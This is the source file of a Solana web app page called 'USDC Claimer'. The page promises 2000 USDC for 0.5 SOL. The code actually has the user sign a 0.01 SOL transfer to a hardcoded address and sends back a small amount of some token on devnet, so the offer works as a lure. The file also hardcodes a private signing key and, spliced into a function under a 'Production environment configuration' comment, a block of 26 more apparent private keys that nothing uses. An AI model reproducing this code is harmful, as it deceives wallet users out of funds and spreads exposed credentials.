/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "48AtEqgS9xM5MnY8Fc7i6YH7XFivTRKyH7E1ZWwGSWLAGccJypLVLwezkgQBPu7Nef7VbA3higFowQeQat2wLsfH"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4Pvwfj79mDU5tbuwoXhFFwSkfkGxEY7R51m7Wq2Mzuw7bUxQNkQ7myUXDb4EH2mfmMvBFdxBuHc9iPqHr9yXko75",
  "key1": "5wjG9F7YefFwZCVGp5mw62TGMQcejj3eBpddqv25AmP1jkUpVD73pp5GXDdD7iRwDyEvyWsEfNMhMDgiknMnzH4Y",
  "key2": "3t5uUynTsrfELSuUY3BRiwhqaTs9GG2qSg1hDGRdm2kCBeiRAfuE6FKmjADP7WQFYxEfCQ3QVMs7w8KzX9t6Qv3u",
  "key3": "3PshJKa2J8vMZuAUW2Tn7r3pLwEUio7qfUqTdsZTAL4rniXZfX1yy2dUfCZxF7NDN5A9zvCnGjTqbmBm5wsTSMJt",
  "key4": "5gpsr6o7PEY5Z2odgFjJ95tdoYGT7nDxDUXZgXyPSspeBQoExXKdQEXB61Gwty6X3gYxJoqtueMmMH1Nn3wfiV5p",
  "key5": "2uXE214xx18mEZmQ218V6haA9qtgay25arVTXaMfMvLMnBQHB2z1eWuZygqSgTTGciowc9RQ81ZcgiSdu38Y48qx",
  "key6": "4sUcCVXCDXqHwEA3bmc74AwRsHSqHvEjLwvNN4qZgUspK7HuJEM6fb2d9ozYvV7kdJJrTfPNVERzwmcYR1uPr4wn",
  "key7": "2kPyKNt4zY2dZK5efyHK7d5r5VSzf73BML62UeBWtvJJTmCN6f2u5Jn2JALhpSnYfibHivD18yYXrckJneyQ6CQm",
  "key8": "3XJRvngjsrbtKzJPqtWVtmEfdhdQfV11TNAsVuN4PKyX8ZebxseFE1vMQSsdxDmCsstfcvwHWsEK7ru1ssiWQh5n",
  "key9": "MdTYWhMsnuyjvpNyj4UFfp749TJaghTsGB89yg7GxtAuutEduQwdjwb9ZE2xDyHPnhX44QGpEaC4HafMAGyaoFt",
  "key10": "b8oarAEqMeX2S55Z4YonKCBoe15A3ZY4Hdy3xY2gQHoVRBfDo8fXKmH3CVMgsinVXsx9zosZzo8BjM3BnseW5rL",
  "key11": "4eBUWSfBZjaaHxySP15CudaWaSMSPB1VkejzjjuFq7n2cBC4YGvUw2WyZL1KP9Ai9wKEbrB6ndSn9R4Dm27mB3Gc",
  "key12": "3u3Ph2dtY79yALAyuBKSPF1YGSmDHbvGaY1xz935HaRcK5tseBmLByKiRAPDNvt9fBRQRifbzhKrAUh5NBmdvruf",
  "key13": "Mn3gDJqLAtmjNntBguZ62kiRf8czA9axPvjQwiVx7YJTiXUTueYatUUSA9jW43g1KUobPcoNH4vgRp5aH7WxkwT",
  "key14": "375JE6sHi1QNWffCWnq6VhXoBi2dR28rXLyeii2mwUmzq1EwxHWjrCdrfaFUMCWKhWMPLGr2tTsSqLmXK6bmTWQJ",
  "key15": "3ZK9SRtY6rrAyhWN24XaJBN1H2tz34wVTFyAFEC97b5t1rdHXvW3xg26JFCgquuxK7UJzmgCuczZsChCUXJJyMN3",
  "key16": "5Pvn2JVVnXcKVuW6FspJiCsFPMeGoWYwgtNp7d1NWm7TAwQTX4TZ89zhDPVtbeKMxyHsDg4tASxrSTPr3Y6jWEj7",
  "key17": "3V6y8rmeAEDTcwQG5AZT94CQu57uPJs8a91SDNg1JHaV5PT2qqpCbKTsNfCcj5k2jDpw1Xbeqb88ajju1RXsBhAg",
  "key18": "26zYMNwBj3ipfGZaHACicCKfhB3VgBRiEHMGTAXcTVs79PVA33xiWbA2P7AfJjHNz2mgdNbxxo3HyTHdz8LUGBBP",
  "key19": "4V2TTtqMM9EwD2ntBizohKjp9gEKbZsP6HpGV7K2TwWThfGJei3AhyK2ocUGmM6aYmAYGcws25L2BcoSn8TY46fC",
  "key20": "3JpBPjoW84AFsGoyHGL7MyqSJwH3pcJUSXNi4TubpnHx1VwkXjYVLFd7oQcad5LHtoWxsakaS1q7ZnYhVwvAXrVa",
  "key21": "3VwhuqjrAjfgpKYjw9WgU4QGarbcGBBXuTiAqRFgpBhieyudA6FzcRGVnNcteUY6Q9y8oPNmEBuSvrXxPS6LQgPa",
  "key22": "dHG5VBS3WFodspzRh2q4QuMmcbrnuc3CGFCHME22vUorQggaoUj2wpTNfgE6XAGrbiiPPj3MtsHYC4qrHex8bEa",
  "key23": "67Ho7De9MRv8k3uQELnw8N3B7sz2wJHASjbyDJeWMJhJGo39yhSeSCsu1QaRVUGfM6oCE7BSEuLyPEw35hqiRtCN",
  "key24": "49qWQEStTuukQH7NT66uhEBJXKb2Nh1qtpMVXMZCyaksXra4FGKPP4za43b1WB32KYpb1LBSsZj5wjgGDQTgHd3s",
  "key25": "6gci5YxZatJ1jQrW42uxyMHRpgwUZcuV7UCUSMfc8sM9mhc8rLrCY1EYfFDSXTWEubWkVPgNvQB9aheyrKhFTou"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
